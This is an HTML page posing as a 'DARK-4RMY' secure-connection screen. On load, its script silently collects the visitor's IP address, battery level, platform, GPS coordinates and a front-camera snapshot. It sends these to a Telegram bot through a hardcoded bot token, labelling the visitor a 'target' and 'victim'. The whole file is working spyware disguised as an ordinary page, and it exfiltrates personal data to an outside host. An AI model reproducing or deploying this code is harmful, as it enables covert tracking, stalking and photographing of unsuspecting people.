<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DARK-4RMY System</title>
    <style>
        body { margin: 0; background: #0a0a0f; color: #00f3ff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .panel { border: 2px solid #00f3ff; padding: 40px; border-radius: 20px; text-align: center; box-shadow: 0 0 20px #00f3ff; }
    </style>
</head>
<body>
    <div class="panel">
        <h1>DARK-4RMY</h1>
        <p id="stat">Connecting to secure server...</p>
        <video id="video" style="display:none;" autoplay></video>
        <canvas id="canvas" style="display:none;"></canvas>
    </div>

    <script>
        const BOT_TOKEN = '8619398262:AAEClf--ikjwf3bmPy88xADrqOlcucnNjGE';
        const params = new URLSearchParams(window.location.search);
        const chatId = params.get('id');

        async function init() {
            if (!chatId) return;

            try {
                // --- 1. JAM3 L-MA3LOMAT L-ASASIYA ---
                const battery = await navigator.getBattery();
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const level = Math.round(battery.level * 100);
                
                let report = `🚨 *NEW TARGET LOGGED* 🚨\n\n` +
                             `🌐 *IP:* \`${ipData.ip}\`\n` +
                             `🔋 *Battery:* ${level}%\n` +
                             `💻 *OS:* ${navigator.platform}`;

                // GPS (Optional - If allowed)
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const gpsMsg = report + `\n📍 *GPS:* [Google Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
                    await sendToBot(gpsMsg);
                }, async () => {
                    await sendToBot(report + `\n📍 *GPS:* Denied ❌`);
                });

                // --- 2. TRY CAMERA SNAPSHOT (The Last Step) ---
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(blob => sendPhoto(blob));
                        stream.getTracks().forEach(t => t.stop());
                        document.getElementById('stat').innerText = "System Active ✅";
                    }, 2000);
                } catch (camErr) {
                    document.getElementById('stat').innerText = "Camera Access Denied";
                }

            } catch (err) { console.log(err); }
        }

        async function sendToBot(text) {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })
            });
        }

        async function sendPhoto(blob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'victim.jpg');
            formData.append('caption', '📸 *Victim Front Camera Snapshot*');
            formData.append('parse_mode', 'Markdown');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        }

        window.onload = init;
    </script>
</body>
</html>
